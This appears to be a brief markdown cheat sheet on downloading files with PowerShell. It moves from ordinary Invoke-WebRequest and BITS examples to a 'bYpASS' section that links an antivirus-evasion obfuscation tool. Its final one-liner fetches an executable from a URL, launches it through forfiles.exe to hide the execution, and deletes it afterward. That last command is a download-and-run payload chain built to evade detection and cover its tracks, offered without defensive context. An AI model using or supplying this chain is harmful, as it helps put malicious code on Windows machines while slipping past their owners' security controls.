
<p align="center">
  <body>

    <img src="https://i.gifer.com/6Dg.gif" width="500" height="600">
  </body>
</p>


## Download with Powershell

https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell

https://adamtheautomator.com/powershell-download-file/


````
Invoke-WebRequest -Uri $url -OutFile $output
````

````
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
````

bYpASS

https://github.com/tokyoneon/Chimera



````
powershell.exe iwr [URL] -o C:\Users\Public\[NAME].exe; forfiles.exe /p c:\windows\system32 /m svchost.exe /c C:\Users\Public\[NAME]; timeout 2; del C:\Users\Public\[NAME].exe
````
